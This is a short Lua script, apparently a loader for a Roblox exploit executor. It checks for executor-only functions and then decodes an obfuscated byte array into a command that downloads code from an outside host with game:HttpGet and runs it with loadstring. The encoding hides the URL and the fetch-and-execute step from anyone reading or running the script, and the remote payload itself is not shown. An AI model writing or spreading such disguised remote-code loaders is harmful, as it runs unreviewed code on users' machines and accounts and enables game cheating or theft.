local environment = _G

if type(getgenv) == "function" then
    local success, env = pcall(getgenv)
    if success and type(env) == "table" then
        environment = env
    end
end

local GUARD_KEY = "__LOADER__"

local now = os.clock()
local lastRun = environment[GUARD_KEY]

if type(lastRun) == "number" and now - lastRun < 8 then
    return
end

environment[GUARD_KEY] = now

local function validateEnvironment()
    local success, loaded = pcall(function()
        return game:IsLoaded()
    end)

    if not success or not loaded then
        return false
    end

    local ok, players = pcall(function()
        return game:GetService("Players")
    end)

    if not ok or not players or not players.LocalPlayer then
        return false
    end

    if type(loadstring) ~= "function"
        and type(environment.loadstring) ~= "function" then
        return false
    end

    local httpOk, httpGet = pcall(function()
        return game.HttpGet
    end)

    if not httpOk or type(httpGet) ~= "function" then
        return false
    end

    return true
end

if not validateEnvironment() then
    return
end

local function decode(data)
    local result = {}

    for i = 1, #data do
        result[i] = string.char((data[i] - 73) % 256)
    end

    return table.concat(result)
end

local source = decode({
    181, 184, 170, 173, 188, 189, 187, 178, 183, 176,
    113, 176, 170, 182, 174, 131, 145, 189, 189, 185,
    144, 174, 189, 113, 107, 177, 189, 189, 185, 188,
    131, 120, 120, 172, 173, 183, 119, 181, 190, 170,
    185, 187, 184, 189, 174, 172, 189, 119, 173, 174,
    191, 120, 190, 120, 127, 171, 172, 128, 173, 121,
    120, 147, 142, 190, 140, 158, 182, 168, 125, 194,
    154, 161, 170, 146, 124, 187, 189, 107, 114, 114,
    113, 114
})

local compiler = environment.loadstring or loadstring

local chunk, compileError = compiler(source)

assert(
    type(chunk) == "function",
    tostring(compileError or "Compilation failed")
)

return chunk()
